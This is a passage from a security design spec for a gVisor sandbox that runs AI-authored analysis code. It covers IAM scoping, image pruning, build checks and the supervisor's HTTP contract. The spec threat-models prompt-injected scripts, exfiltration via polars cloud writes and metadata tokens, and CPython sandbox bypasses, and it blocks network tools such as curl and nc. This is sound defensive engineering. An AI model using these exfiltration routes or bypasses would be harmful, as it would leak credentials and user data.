  `roles/monitoring.viewer`, `roles/stackdriver.resourceMetadata.writer`,
  `roles/artifactregistry.reader` — and nothing else. Terraform cannot create it (and under
  `manage_iam = false` is not allowed to), so `var.sandbox_node_service_account` is a
  **required input whenever `sandbox_pool_enabled = true`**, in every mode, and **never** falls
  back to `null` the way the primary pool's does. `null` there means the Compute Engine default
  SA, which in most projects carries `roles/editor`.

  **As shipped, be precise about what "validated" means: it is a format and identity check, not
  a privilege check.** Three `lifecycle { precondition }` blocks on the pool resource (not
  variable validations — so they fire only when the pool is actually being created, and the
  escape hatch is "don't create the pool", never "create it with a weaker SA"): the email must
  match `<name>@<project_id>.iam.gserviceaccount.com` in *this* project, case-folded; it must
  not be `genetics-suite`; and it must not equal `var.node_service_account`. That third check is
  the one that matters most and was missing from earlier drafts — under the live
  `manage_iam = false` mode the primary pool grants `oauth_scopes = ["cloud-platform"]`, so
  reusing its SA would put the suite's **entire credential** on the node running untrusted code.
  **Terraform neither creates the SA nor reads back the roles bound to it.** The `gcloud` recipe
  in `README.md` is the only thing bounding them, and nothing checks that the operator did not
  grant more — so an over-privileged SA passes every check here. The variable keeps
  `default = ""` only because omitting a default makes terraform prompt interactively; `""`
  fails the first precondition.
- **Explicit `oauth_scopes`**, not the provider default, and **the rationale is narrower
  than it looks.** An earlier draft called node scopes "the second bound on any token the
  metadata server would mint". In `GKE_METADATA` mode that is **false**: tokens handed to
  pods are minted for the Workload-Identity-bound GSA through the IAM Credentials API and
  are not scope-limited by the node at all, and pods cannot reach the node SA's own token
  in that mode. Node scopes bound only the node SA's own token. So scope reduction is
  defence-in-depth for the **`GCE_METADATA` misconfiguration case** (and for a gVisor
  escape reaching the node, residual #1) — it is *not* load-bearing for the pod-facing
  guarantee, and nothing in this document may be built on the assumption that it is.

  **Name the scopes explicitly; "scope down from `cloud-platform`" with no value will
  break the pool.** Artifact Registry image pulls go through the storage API and need
  `devstorage.read_only` — `roles/artifactregistry.reader` on the SA is *not* sufficient
  on its own. The minimum set:
  `https://www.googleapis.com/auth/devstorage.read_only`, `logging.write`, `monitoring`,
  `monitoring.write`, `service.management.readonly`, `servicecontrol`, `trace.append`.
- **The `manage_iam = false` deployment is the dangerous one.** The IAM resources in
  `terraform/iam.tf` are gated `count = var.manage_iam ? 1 : 0`, and the primary pool's
  `workload_metadata_config` is gated on the same variable — so in a deployment where a
  platform team owns IAM and `manage_iam` is false, the bad defaults above are precisely
  what applies.

  **The review gate is not a plan inspection.** An earlier draft said `4h6.10` "fails
  review if a `terraform plan` under `manage_iam = false` produces a sandbox pool without
  `GKE_METADATA`". That gate passes cleanly and catches nothing: the pool *does* plan with
  `GKE_METADATA`; what is missing is the cluster's `workload_pool`, and that only surfaces
  at apply. `4h6.10` instead fails review unless **all three** of the following hold by
  inspection of the terraform source:
  1. `google_container_cluster.primary.workload_identity_config` is unconditional — not
     inside any `dynamic` or `count` gated on `var.manage_iam`.
  2. The sandbox pool's `workload_metadata_config { mode = "GKE_METADATA" }` is likewise
     unconditional.
  3. `var.node_service_account` is validated non-empty whenever `manage_iam = false`, with
     no `null` fallback path reachable for the sandbox pool.

  A `terraform apply` in a non-production project with `manage_iam = false` is the
  confirming test, because apply is where this class of error appears.
- GKE automatically taints gVisor nodes `sandbox.gke.io/runtime=gvisor:NoSchedule`, so no
  suite workload can drift onto it; the sandbox Deployment sets the matching toleration and
  `runtimeClassName: gvisor`.
- `node_config.machine_type` is ForceNew on `google_container_node_pool` — this is a *new*
  pool resource, not an edit to the existing one, so no destroy/recreate of the primary
  pool is involved.
- Steady-state surge total for the main pool is unchanged. Re-derive nothing.

**Judgement call flagged for the user:** this is roughly one extra small always-on node.
Against ~1,842 USD of measured LLM spend it is minor, but it is a standing cost for a
threat (kernel escape) that has not occurred. The cheaper alternative — sandbox on the
existing pool with `RuntimeDefault` seccomp only — requires re-deriving the surge budget
against a pool that is already over, and accepts kernel-boundary-only isolation. If cost
wins, that is the fallback; nothing else in this document changes.

### Rejected controls, with reasons

- **Custom seccomp profile.** A tighter-than-`RuntimeDefault` profile needs a node-local
  file distributed by DaemonSet and referenced via `localhostProfile`, and the syscall set
  CPython + numpy + polars + matplotlib actually touch is large and changes with wheel
  versions. The realistic outcome is latent breakage that gets "fixed" by loosening the
  profile until it is `RuntimeDefault` again. `RuntimeDefault` already blocks the
  escape-relevant set (`add_key`, `keyctl`, `bpf`, `mount`, `ptrace` beyond self, namespace
  `clone` flags), and gVisor supersedes the marginal gain.
- **In-interpreter sandboxing** (`RestrictedPython`, `sys.addaudithook`, import hooks).
  Not a security boundary and will not be presented as one. CPython has no supported
  in-process confinement; every published bypass chain (`__subclasses__`, `ctypes`, frame
  walking) works. The boundary is the pod, the network policy and the kernel — full stop.
- ~~**`hostAliases` instead of DNS.**~~ **Not rejected — adopted as the v1 default.** See
  section 3, "On DNS". An earlier draft kept kube-dns egress and booked DNS tunnelling as
  a low-bandwidth residual; that arithmetic was wrong and the decision is reversed.

### Where the image lives

**Decision:** a new `sandbox/` build context in **this** repo (genetics-results-suite),
built by `scripts/build-all.sh` and `scripts/build.sh` alongside the existing `monitor` and
`keycloak` local contexts. The SDK is pip-installed from genetics-mcp-server at build time.
Rationale: the hardening (base image, uid, absent shell) is deployment policy and must stay
consistent with the manifests in `k8s/`, which live here; and this repo is the spec of
record for cross-repo concerns.

### As built (`4h6.6`) — what shipped, and the two places it departs from the above

`sandbox/` in this repo: `Dockerfile`, `requirements.txt` (pinned analysis deps),
`build-checks.py` (build-time assertions), `prewarm.py`, `supervisor.py`,
`prune_venv.py`, `genetics_alias.py` (installed into the venv as `genetics.py`), `schema/`
and `stubs/`. Built by
`build-all.sh` and by `build.sh sandbox`, tagged from this repo's HEAD like `monitor` and
`keycloak`, with the genetics-mcp-server commit recorded in the image label
`com.fulltiltgenomics.genetics-mcp-server-ref` because the tag alone does not identify the
contents.

**Deviation 1 — the builder is `python:3.11-slim`, not `python:3.12-slim`.**
`gcr.io/distroless/python3-debian12:nonroot` ships **CPython 3.11.2** (bookworm's system
python), verified by running it. The final stage runs *that* interpreter against the venv's
site-packages, so a 3.12 venv would place cp312-tagged native wheels — numpy, scipy, polars
and matplotlib all ship them — in front of a 3.11 interpreter and fail at import. The
builder must track the base image's minor version. The decision's intent (venv built in a
slim stage; no compiler, pip or package manager in the final image) is unchanged.

**No pip, and it took a second pass to be true.** `python -m venv` seeds pip and
setuptools into the venv, and the final stage copies the venv verbatim, so the first
build of this image shipped `pip 24.0` and `setuptools 79.0.1`: `python3 -m pip install`
ran inside the sandbox, and the assertion that was supposed to catch it walked only the
distroless rootfs — never `/opt/venv`, which is where they were. `sandbox/prune_venv.py`
now deletes pip, setuptools, `pkg_resources`, `_distutils_hack` and the whole of
`/opt/venv/bin` in the builder stage, and the assertion walks `/dl`, `/opt/venv` and
`/out` and additionally proves the modules are not importable. Nothing needed
`/opt/venv/bin`: the entrypoint is `/usr/bin/python3` with `PYTHONPATH` at
site-packages, and the venv's own `bin/python3` was a dangling symlink to the builder's
interpreter in any case.

**Deviation 2 — the SDK is installed `--no-deps`, and only its import closure ships.**
"The SDK is pip-installed from genetics-mcp-server at build time" and "no
`google-auth`-based client in the image" (section 3(c)) cannot both hold if
genetics-mcp-server's own dependency set is resolved: that set contains
`google-auth[requests]`, plus anthropic, openai and fastapi. The image therefore installs
the package with `--no-deps` from a staged checkout and declares the SDK's real runtime
closure itself in `sandbox/requirements.txt` (numpy, scipy, polars, matplotlib, httpx —
`python-dotenv` was needed only while `config/settings.py` was in the closure, and went
with it; see below). `build-checks.py` fails the build if a
`google-auth`/`google-cloud` distribution reappears by any route, and separately if
`import google.auth` succeeds. The cost is that the closure is declared in two places and
can drift: an SDK that grows a new dependency fails the build's import check rather than
silently shipping.

`--no-deps` bounds the *distributions*; it does not bound the *files*, and pip installs
the whole `genetics_mcp_server` package — 48 modules, of which the SDK imports 11. The
other 37 (chat_api, llm_service, mcp_server, mcp_proxy, subagent, `config/`, `auth/`,
`routers/`, `db/`, `skills/`, `scripts/`) are unimportable in the sandbox for want of fastapi and
anthropic, but that is the wrong property to rely on: a prompt-injected script *reads*
files, and `auth/core.py` is the `X-Goog-Authenticated-User-Email` model every service in
the suite trusts. `sandbox/prune_venv.py` therefore cuts the installed package to an
explicit `SDK_ALLOWLIST`, and `build-checks.py` asserts the surviving set *equals* it, so
the surface grows deliberately rather than with the next `pip install`.

**One file in `site-packages` is not part of that distribution: `genetics.py`**
(`sandbox/genetics_alias.py`, copied by the Dockerfile — `genetics-results-suite-706`). It
is three lines that rebind `sys.modules[__name__]` to `genetics_mcp_server.sdk`, so
`import genetics` — the name `run_analysis`'s description, `list_capabilities`' module
enum, the shipped `stubs/genetics.pyi` and `schema/README.md` all already use — resolves to
the SDK **itself** rather than to a second module object with its own copy of the client
state. It ships only here: `genetics` is too generic a top-level name to claim in
chat-backend and mcp-server, which install the same distribution. It is outside
`prune_sdk`'s reach by construction (that walks `site-packages/genetics_mcp_server` only)
and outside `_sdk_surface`'s assertion for the same reason; a separate build check asserts
the *identity*, not merely that the import succeeds. Disclosure: it names
`genetics_mcp_server.sdk`, which the stubs already do.

**`config/settings.py` used to be in the closure; it no longer is** (`l41`). It reached
the image because `sdk/client.py` imports `tools/executor.py`, whose module-level `from
genetics_mcp_server.tools.uniprot import UniProtClient` pulled `from
genetics_mcp_server.config.settings import Settings`, and `ToolExecutor.__init__` called
`get_settings()` at construction. So the sandbox shipped a file naming
`INTERNAL_API_SECRET`, `ANTHROPIC_API_KEY`, `BIGQUERY_API_URL`, `ADMIN_USERS`,
`ALLOWED_EMAILS`, `GOOGLE_TOKEN_AUDIENCE` and the on-disk paths of the two SQLite
databases — names, never values, but names are the internal model an attacker would
otherwise have to guess. Both edges were cut in genetics-mcp-server: uniprot's `Settings`
import is behind `if TYPE_CHECKING` with a string annotation, and the executor resolves
settings through `_resolve_settings()` at first use, falling back to a frozen
`_PrunedInstallSettings` carrying `Settings`' own defaults when the module is absent —
which is exactly this image, and which is correct there because the sandbox pod holds no
internal secret (`4h6.9`). The secret is hard-coded empty in that fallback rather than
read from the environment, so the variable's *name* does not come back into the image
through the replacement. `tests/test_sdk_import_closure.py` in genetics-mcp-server pins
the 11-module closure so it cannot regrow silently; `SDK_ALLOWLIST` here is the
build-time backstop.

**`tools/executor.py` still ships, and remains a residual disclosure.** `sdk/client.py`
imports `ToolExecutor` directly and every SDK method delegates to it, so it cannot leave
the closure without a rewrite of the SDK. With it ship the five SQL-building
methods an earlier draft recorded as blocking the sandbox path — their interpolation is now
guarded by `tools/sql_safety.py`, see "Handoffs" below — and these environment-variable names — re-derive this
list by grepping the eleven closure modules, not by trusting it:

| name | where | kind |
|---|---|---|
| `GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL` | `tools/executor.py`, the `base_url` / `public_url` / `bigquery_url` properties | live `os.environ.get` |
| `PERPLEXITY_API_KEY`, `TAVILY_API_KEY`, `LITERATURE_SEARCH_BACKEND` | `tools/executor.py`, the literature-search tools | live `os.environ.get` |
| `INTERNAL_API_SECRET` | `sdk/__init__.py` and `sdk/client.py` docstrings/comments; `stubs/genetics.pyi`, `stubs/client.pyi`, which the final stage copies to `/genetics/sdk/` | prose only, no read — and since `4h6.44` the prose is a **negation**: both stubs say the sandbox credential is the per-execution token and never this secret |

The three endpoint names are a map of the injection sites in the one backend the sandbox
may reach. The three literature-search names are live reads whose values the sandbox pod
does not hold; removing them would change the behaviour of those tools and is out of scope
here.

`INTERNAL_API_SECRET` in the SDK docstrings and the shipped stubs is an **accepted
residual**, not an oversight (`4h6.13` recorded the exfiltration note in `client.pyi` as
operational knowledge the agent is meant to read) — but **the argument for keeping it has
changed with `4h6.44`, and the earlier one is no longer available.** That argument was that
"endpoint URLs are not configurable because the client attaches `INTERNAL_API_SECRET` to
every request" is a warning the reader can check against the deployment. The premise is now
false on the sandbox path: the client attaches a **per-execution, audience-bound token** and
never the shared secret, so a stub that said otherwise would be teaching the model a
deployment that does not exist.

What the stubs say now, and why the name still appears, is the **negation** — the SDK does
not use `INTERNAL_API_SECRET`, it uses a credential the supervisor delivers per execution.
That is worth naming for two reasons. It remains checkable against the deployment, which is
what made the original phrasing preferable to a genericised "an internal credential". And it
carries the operational fact the reader actually needs: the credential in hand is short-lived
and scoped, so a script that tries to hoard it is hoarding something that expires, and the
endpoint URLs are still not parameters because handing *that* token to a chosen host is still
handing a live credential somewhere it should not go.

It discloses nothing the reader cannot already derive — the SDK it is being handed
authenticates on its behalf — and the sandbox pod does not hold the value (`4h6.9`), so
`os.environ.get("INTERNAL_API_SECRET")` inside the sandbox returns nothing: the name is not a
key to anything present, and after `4h6.44` it is not even a key to anything the SDK would
send. This is a different calculus from `config/settings.py`, which named a dozen *unrelated*
variables and so handed over the shape of the whole internal surface rather than the one
credential the caller is already using.

**The stubs are generated, so this passage is checkable rather than asserted.**
`scripts/gen-sandbox-docs.py --sdk-src` derives `stubs/client.pyi` and `stubs/genetics.pyi`
from the SDK source, `scripts/test-sandbox-docs.py` fails if the committed stubs differ from a
fresh generation, and `scripts/build.sh` stages them into the image. A change to the SDK's
docstrings therefore *cannot* leave the shipped stubs describing the old transport without
failing that check — which is what caught this row after `4h6.44` landed. Re-derive the row
above from the regenerated stubs; do not adjust it in place.

What is *not* in the residual list: `config/settings.py` and `auth/core.py` are both out of
the closure and neither ships, so no LLM provider key, allow-list, OAuth audience or
database path is named anywhere in the image. No values of any kind ship — every entry
above is a name.

**Build-time assertions** (`sandbox/build-checks.py`, run in the builder stage against the
artefacts the final stage copies, because the final stage has no shell to check anything
in) — ten of them: `/etc/nsswitch.conf` present with `files` before `dns` (section 3(b));
no shell, package manager, `pip`, `curl`, `wget`, `nc` or `ssh` anywhere in `/dl`,
`/opt/venv` or `/out`; pip/setuptools/`pkg_resources` not importable; no `google-auth`
distribution in the venv and `import google.auth` failing; any native object carrying a
GCE metadata client answered by a literal-IP `GCE_METADATA_HOST` in the final stage
(section 3(c), below); the surviving `genetics_mcp_server` modules equal to the SDK
allow-list; no `PLACEHOLDER*` file in the staged `schema/` or `stubs/`; every analysis
library **and `genetics_mcp_server.sdk`** importing cleanly; `passwd` carrying both uids
on the shared gid; the matplotlib font cache baked. The probes run
`python3 -S` with `PYTHONPATH` at site-packages rather than `/opt/venv/bin/python3`,
which no longer exists and which was never how the final image runs anyway.

**Section 3(c) is met by its second branch, not its first.** "No `google-auth`-based
client in the image" was only ever true of the *Python distribution name*, which is not
the property the control needs. polars links `object_store`, a full Rust GCS/S3/Azure
client: in the built image `pl.scan_parquet("gs://…")` performs the metadata token
request itself, with no google-auth and no Python in the path, and the native object
contains `metadata.google.internal`, `169.254.169.254`, `computeMetadata`,
`GCE_METADATA_HOST` and `oauth2.googleapis.com`. Left alone that is a name resolution
inside a DNS-less pod — the multi-second stall 3(c) exists to prevent, measured at
**86.7s** for one `scan_parquet` against a blackholed resolver — and, in a pool that ever
runs in GCE_METADATA mode, a two-line token mint. The image therefore takes 3(c)'s named
fallback and sets `GCE_METADATA_HOST=169.254.169.254`. **Verified, not assumed**: with the
variable pointed at a listener on `127.0.0.1`, object_store sent it
`GET /computeMetadata/v1/instance/service-accounts/default/token?audience=…` — it honours
the variable, so the pin keeps the name out of the resolver. What the pin does *not* do is
confine anything: `pl.write_parquet("s3://…")` remains an exfiltration primitive
independent of httpx, and it is `4h6.8`'s NetworkPolicy that closes it. `build-checks.py`
now greps the venv's `.so` files for the metadata strings and fails unless the final stage
pins the variable to a literal IPv4, because the old check — grep for distribution names,
`import google.auth` — reported green while the capability sat compiled into Rust.

**The image does not build without the SDK, deliberately.** `4h6.11` has landed on
genetics-mcp-server's `worktree-db-only-architecture` branch but not on `master`, so a
default `build-all.sh` still finds no `src/genetics_mcp_server/sdk/` and skips the sandbox
with a loud message while the rest of the suite builds; `build.sh sandbox` fails hard,
because asking for that image by name and getting one without the SDK would be worse than
an error. Building against the branch that has it (`MCP_SERVER_BRANCH=…`) is what the
assertions above were verified against.

**The image does not build with `4h6.13`'s placeholders either, by the same reasoning.**
Shipping them degrades *silently*: `run_analysis` runs, the pod is healthy, and the model
reads a file telling it this is not the real schema. `build-checks.py` fails the build on
any `PLACEHOLDER*` file in the staged trees, which couples this image to `4h6.13` exactly
as the import assertion couples it to `4h6.11`. `4h6.13` has since landed and the
placeholders are gone — see "Schema docs and stubs" below.

**Interpreter pre-warming is split.** The image supplies `/genetics/prewarm.py` (the module
list and a `prewarm()` that imports it, **raising `PrewarmError`** on any failure rather
than returning the names — none of these modules is optional, and a supervisor that
ignored the return value would answer health checks while every plotting script failed
inside the child) and bakes the two costs that a fork cannot amortise:
`.pyc` for the whole venv (`compileall`; the root filesystem is read-only, so without this
every import in every execution recompiles) and the matplotlib font cache. The long-lived
supervisor that calls `prewarm()` before its first fork is `4h6.39`'s; the image has **no
`CMD`**, because a placeholder supervisor would be indistinguishable from a real one at
runtime. Cold import of the full stack measured **2.99s** in the built image — that is the
per-execution cost pre-warming removes.

**Hard contract for `4h6.39` on matplotlib, verified not assumed.** `MPLCONFIGDIR` pointing
at a read-only directory does **not** merely warn on matplotlib 3.10: with no writable
`/tmp` it raises `OSError: Matplotlib requires access to a writable cache directory`. So the
supervisor **must** copy `$GENETICS_MPLCACHE` (`/genetics/mplcache`, the baked font cache)
into a writable directory and point `MPLCONFIGDIR` there **before** importing matplotlib.
This is startup work, not per-execution work: the child inherits the imported font manager
through the fork, so the per-execution `MPLCONFIGDIR` under `/scratch/<id>` required by the
writable-paths row costs nothing.

**Environment the image sets**, all of it non-per-execution: `PYTHONPATH` (the venv's
site-packages — the venv's `bin/` is deleted in the builder stage, and its `python3` was a
symlink to the builder's interpreter), `GCE_METADATA_HOST=169.254.169.254` (section 3(c);
see "met by its second branch" above — this one is a security control, not a convenience,
and `build-checks.py` fails the build if it is removed while polars ships),
`PYTHONUNBUFFERED`, `PYTHONFAULTHANDLER`, `MPLBACKEND=Agg`, `GENETICS_MPLCACHE`,
`GENETICS_SCHEMA_DIR`, `GENETICS_STUBS_DIR`, `GENETICS_PREWARM`, and
`SANDBOX_SUPERVISOR_UID` / `SANDBOX_CHILD_UID` / `SANDBOX_SHARED_GID` (65532 / 65533 /
65532) so `4h6.7` and `4h6.39` read the uids rather than restating them — but the uid choice is
now settled as option (b), one shared uid 65532 ("The uid choice", section 2), so
`SANDBOX_CHILD_UID` names a uid nothing can switch to and `4h6.39` must not fork against it. `TMPDIR`, `HOME`,
`MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` are deliberately **not** set:
they are per-execution and belong under `/scratch/<execution-id>`, and a fixed value in the
image would recreate exactly the shared cross-execution directory that removing the
pod-level `/tmp` eliminated.

**Schema docs and stubs (`4h6.13`, landed).** `scripts/gen-sandbox-docs.py` writes schema
markdown into `sandbox/schema/` and `.pyi` signature stubs into `sandbox/stubs/`; the
Dockerfile copies those directories verbatim to `/genetics/schema/` and `/genetics/sdk/`
owned `65532:65532`, exported as `GENETICS_SCHEMA_DIR` and `GENETICS_STUBS_DIR`. **No
Dockerfile change was needed** — the contract `4h6.6` fixed held exactly as written. The
`PLACEHOLDER*` files are gone and neither directory is empty; `build-checks.py` still
fails the build on any `PLACEHOLDER*` file, so the coupling stays. `/genetics/sdk/` is
**not** on `PYTHONPATH` and must not be added to it — the importable SDK is the real
package in `/opt/venv`, and two copies of those names on `sys.path` would shadow silently;
the generated stubs say so in their own header.

**Neither tree names the BigQuery dataset any more (`bee`).** The worked example SQL and
the `sql()` docstring used to be written `FROM genetics_results.<view>`, so both shipped
directories carried the production dataset name into the image. They now name views bare
(`FROM <view>`) because db-api rewrites a bare name in a table position to its own
`DATASET_ID` before `authorize_query` sees it. The security consequence is small but real
and runs one way only: the image no longer discloses which dataset backs the views, while
the allow-list check is unchanged — it still compares fully-qualified ids, after the
rewrite, so a script that qualifies a table itself is still refused. View *names* remain
disclosed, as they always were, and are separately obtainable through
`get_database_schema`.

Both trees are *generated, never transcribed*. The schema markdown is rendered from this
repo's canonical `configs/datasets.yaml` — one file per entry under `tables:`, carrying its
description, columns, enumerable columns and worked example SQL — and the stubs are read
out of the genetics SDK's source with `ast` (never imported: importing would execute
`genetics_mcp_server.config.settings`, and the build host has no polars or httpx). The
generator names no view and no SDK function; `scripts/test-sandbox-docs.py` asserts that,
asserts the three correctness rules `4h6.13` names are present *in `datasets.yaml`*, and
asserts that mutating those YAML fields moves the generated output. The reason is that a
transcribed rule has no runtime symptom: the image builds green while `/genetics/schema`
contradicts the canonical file, and `genetics-results-suite-5p5` is an open P1 that will
rewrite `credible_sets_v`'s variant/chr guidance. Both build scripts regenerate before
building, so the image can never document a schema older than the file it came from;
`build.sh sandbox` fails hard if generation fails, `build-all.sh` skips the sandbox loudly.
The generated files are also committed, so the directories are never empty and the diff of
a `datasets.yaml` change is visible in review.

**Image size is 607 MB.** numpy, scipy, matplotlib and polars are most of it. Noted because
the sandbox node pool is pinned at one node and pulls the image on every node replacement.

### The HTTP contract between chat-backend and the supervisor (`4h6.38`)

**This subsection is the interface, because there cannot be a shared module.** The image
pip-installs only the genetics SDK's import closure and `sandbox/prune_venv.py` deletes
everything else, so chat-backend's client (`4h6.47`) and the supervisor (`4h6.39`) cannot
import one definition of the wire shape. Two implementers building against different
assumptions is not recoverable by fixing one side. Every field below therefore states its
type, whether it is required, and what happens when it is absent or malformed; a field not
listed here does not exist.

**Why it lives in section 2 rather than section 4.** Every value on this wire is a
section-2 row's wire form — the 60s/120s wall clock, the 64 KiB output cap, concurrency 1
with a queue, `/scratch/<execution-id>` and its quotas, and the artifact manifest. The
tokens the body carries are section 4's decision and are **not** re-opened here; this
subsection says only how they travel and what the supervisor does with a set that does not
hang together.

**It must not depend on Kubernetes.** A local Docker backend is coming (`4h6.40`): the same
image runs in a plain container for development, and **the contract is identical in both**.
Nothing in the request or the response may carry a downward-API field, a service account, a
ClusterIP or a cluster DNS name, and the client holds exactly one configuration value — a
base URL. What genuinely differs is deployment-only and is listed here so that nobody adds a
wire field to compensate for it: `runtimeClassName: gvisor` and the node pool; the egress
NetworkPolicy; `hostAliases` versus whatever the dev container resolves `db-api` and
`results-api` with; and `/scratch` as an `emptyDir` versus a container-local directory. A
supervisor that reads any of those to answer a request is wrong in one of the two
deployments.

#### Transport

Plain HTTP/1.1 on `0.0.0.0:8080` — the container port `k8s/deployments/sandbox.yaml`
declares and the Service maps 8080 → 8080. No TLS: on the cluster the hop is pod-to-pod and
the ingress allow-list (section 3) is the control; in the local container the equivalent is
binding to loopback and not publishing the port. Request and response bodies are
`application/json; charset=utf-8`. **The supervisor parses the request's `Content-Type` as a
media type and ignores its parameters**, so a bare `application/json` — which is what
`4h6.47` sends — is accepted exactly as the charset form is; the `415` row below means the
*media type* is not `application/json`. Stated because this paragraph and that row phrase it
differently, and a supervisor doing an exact string compare against the charset form would
`415` every request the client makes. Exactly three routes exist — `GET /health`,
`POST /execute` and `GET /artifact` — and there is no fourth; any other path is `404`, any
other method on these three is `405`. `GET /artifact` is the only one whose input is a query
string rather than a body, because it carries no secret (see its subsection below).

**There is no HTTP-layer authentication on `/execute`, and that is a decision rather than an
omission.** The sandbox pod holds no credential it could verify a caller against, and giving
it one would put a static secret in the single workload that runs attacker-influenceable
code by design — the thing section 4 exists to prevent. The network is the authentication,
in both deployments. Consequence, stated so it is not discovered later: anything that can
reach port 8080 can execute code with whatever tokens it supplies, so the ingress allow-list
is load-bearing and a dev container must not publish the port.

**Everything travels in the JSON body; nothing travels in a header.** No `Authorization`, no
`X-Execution-Id`. Headers are what proxies log, the tokens must never be logged, and a split
between headers and body gives two places for the same value to disagree.

#### `GET /health`

No authentication, no request body, no query parameters. The `readinessProbe` in
`k8s/deployments/sandbox.yaml` points here and reads only the status code.

- `200` with `{"status": "ok", "busy": <bool>, "queued": <int>}` once the supervisor is
  serving — meaning after its startup assertions have passed (`/etc/nsswitch.conf` ordering,
  `prewarm()`; see the `4h6.39` scope and the handoff table). `busy` and `queued` are
  informational only. **`queued` counts requests *waiting*, and does not count the one
  executing** — the same definition the queue bound below uses, so `busy: true, queued: 0`
  means one running and nothing behind it. Reporting a different number here from the one
  the bound is enforced against is how a client ends up predicting the wrong `429`.
- `503` with the same body shape before that point and while draining after `SIGTERM`, with
  `status` holding `"starting"` in the first case and `"draining"` in the second. `status`
  takes exactly those three values.
- **`/health` is the one route exempt from the uniform error shape below**, and the exemption
  is deliberate rather than an oversight: the probe reads only the status code, and a client
  polling for recovery wants `busy`/`queued` in the 503 as much as in the 200. Stated
  explicitly because the rule in "Error responses" is otherwise absolute, and a client that
  parsed a `/health` 503 as `{execution_id, error}` would `KeyError` on every startup.
- **A busy supervisor is healthy.** `/health` returns `200` while an execution is in flight.
  Reporting `503` there would remove the pod from the Service endpoints mid-execution, which
  with one replica means the client's own in-flight request is the last one that works and
  every retry fails against no endpoint at all. Readiness must not flap on load.
- The body discloses no execution id, no user, no session and no counts attributable to
  anyone. `queued` is a depth, not an inventory.

#### `POST /execute` — request

One JSON object. **Unknown top-level fields are rejected with `400`** rather than ignored,
so a field added on one side and not the other fails loudly on the first call instead of
being silently dropped — which is the exact failure this whole subsection exists to prevent.
The request body is capped at **1 MiB** total (`413` above it), measured on the **raw bytes
on the wire**, and the supervisor stops reading at the cap rather than buffering past it.

**The body also has a time bound: 10s from the request line to the last byte, then `408`
with `error.type: "RequestTimeout"`.** A size cap alone does not bound a slow client, and
with concurrency 1 a request dribbling its body holds the supervisor's only slot for as long
as it likes — the size cap never fires because the bytes never arrive. 10s is far above any
honest 1 MiB pod-to-pod POST and far below the wall clock, so it can only fire on a stalled
or hostile peer.

| field | type | required | absent or malformed |
|---|---|---|---|
| `code` | string, UTF-8 Python source, ≤ 256 KiB | yes | absent, not a string, empty or whitespace-only → `400`. Over 256 KiB → `413`. **Measured on the UTF-8 encoding of the decoded string** (`len(code.encode("utf-8"))`), not on the JSON-escaped bytes — escaping can triple the on-wire length of the same program, and the two ends must not disagree about which one the limit is. The 1 MiB body cap is the one measured on the wire. |
| `execution_id` | string matching `\A[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\Z` | yes | absent or non-matching → `400`. The supervisor **must not** mint one of its own. **The anchors are `\A`/`\Z` and the match is a *full* match, deliberately:** in Python `$` also matches immediately before a final newline, so the `^…$` this row used to carry accepts `"…663\n"` — which then names a directory, is exported as `SANDBOX_EXECUTION_ID` and is echoed back in the response, i.e. a log-injection primitive on the one field this table calls strict. Any implementation of this row in any language must reject a trailing newline. |
| `tokens` | object, exactly the two keys `db-api` and `results-api`, values compact JWS strings | yes | either key missing, an extra key, or a non-string value → `400`. Never run without them. |
| `user` | string, the authenticated end-user email | yes | absent or empty → `400`. Must equal the tokens' `sub`. |
| `session_id` | string, the chat session id | yes | absent or empty → `400`. Must equal the tokens' `sid`. |
| `timeout_s` | integer seconds, `1 ≤ timeout_s ≤ 120` | no, default **60** | absent → 60. Non-integer, ≤ 0, or **> 120 → `400`, not clamped** (see below). |

**`execution_id` is one value in three roles**, and the strict uuid4 form is not
fastidiousness: it becomes the `/scratch/<execution-id>` directory name, so any laxer rule
re-opens path traversal on the one request value that names a filesystem path. The three
roles are the directory name, the `jti` of both tokens, and the join key that makes the
`4h6.12` audit trail, db-api's `endpoint_access` lines and chat-backend's manifest record
line up. `mint_execution_tokens` takes an optional `execution_id=` for precisely this
(section 4, "As built"), and it **raises `SandboxTokenUnavailable`** when the signing key is
unset — which the client must surface, never catch and continue.

**When the three roles disagree — refuse, do not pick a winner.** The supervisor decodes
each token's payload segment **without verifying the signature** (it holds no signing key,
deliberately, and never will) purely to read `sub`, `sid`, `jti` and `exp`. These are
consistency checks on its own caller, **not authentication** — the security decision is
db-api's and results-api's verification (section 4), and nothing here may be mistaken for
it. The rules:

| condition | result |
|---|---|
| a token is not three dot-separated segments, or its payload is not decodable JSON | `400` |
| the two tokens' `jti` differ from each other | `400` |
| either `jti` ≠ the body's `execution_id` | `400` |
| a token's `aud` ≠ the key it was sent under | `400` |
| a token's `sub` ≠ the body's `user`, or `sid` ≠ the body's `session_id` | `400` |
| `exp` is already past **at dequeue** (see concurrency) | `409`, `error.type: "TokenExpired"` |

Refusing rather than preferring one value is the point. Preferring the `jti` would name the
directory one thing and stamp the audit another; preferring the body would hand the child
credentials whose `jti` joins to no directory. Either way every downstream record keys on a
value some other record does not carry, and the damage is invisible until somebody asks
"what did that script read?" and gets nothing back. A mismatch means the tokens were not
minted for this request, and that is a caller bug worth a hard failure on the first call.

**The tokens travel in the body and nowhere else.** Never pod env, never a ConfigMap, never
a Secret: chat-backend cannot set environment variables on a running pod, and a pod-spec
value turns a 300s per-execution credential into a static pod-lifetime one. The supervisor
places them in the forked child only — under the decided shared-uid model their protection
is **lifetime** (the SDK reads the file once and unlinks it), not permissions. The
supervisor must never log a token, must never echo one in a response, and must not keep one
after the child is reaped.

**The timeout is bounded and the model cannot raise it.** 60s default, 120s hard ceiling
(section 2's Wall clock row). Two independent things enforce that: `run_analysis` exposes no
timeout parameter to the model at all, so no model-authored value ever reaches this field;
and the supervisor **rejects** `timeout_s > 120` with `400`. **Decision: reject, not clamp.**
Clamping is a silent behaviour change on a path fed from a model-influenceable direction — a
caller asking for 300 has either a bug or a jailbreak, and both deserve to be visible. It
would also desync the two deadlines: the client sets its own deadline *above* what the
supervisor can take (`4h6.47`; see the arithmetic under "When the client goes away"), and a
silently clamped server-side value makes the client's arithmetic wrong.

**Timeout semantics.** `timeout_s` is the child's wall clock measured **from the fork**, not
from request receipt — queue wait does not count against the script. On expiry the
